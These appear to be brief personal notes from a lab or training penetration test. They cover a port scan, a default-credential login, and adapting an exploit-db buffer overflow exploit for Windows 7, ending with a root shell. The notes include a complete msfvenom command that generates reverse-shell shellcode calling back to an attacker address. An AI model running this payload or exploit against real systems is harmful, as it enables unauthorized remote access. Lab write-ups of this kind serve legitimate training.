initial scans show ports 80, smb, rpc, rdp, 3573(tag-ups-1?) open

webpage greets with login form, admin:admin does the job
we find a universal buf overflow exploit
and try to make it work
https://www.exploit-db.com/exploits/10099
we keep getting connection refused. we suspect the port 4444 is a bad port, so we'll have to regen the buf_overflow with new port
HINT TAKEN : The original exploit was tested on windows server 2005, but our target is windows 7. regen exploit for that.
We also need to escape backslashes from the "bad chars" mentioned in the exploit
so, `\x00` becomes `\\x00`

`msfvenom -p windows/shell_reverse_tcp -b '\\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c\\x3d\\x3b\\x2d\\x2c\\x2e\\x24\\x25\\x1a' LHOST=192.168.45.195 LPORT=4444 -e x86/alpha_mixed -f c`

replace the generated buf_overflow chars, and replace in the original exploit code.
we think this is a bind shell, and keep doing nc -nv IP PORT
but it is a reverse shell, duh!
root!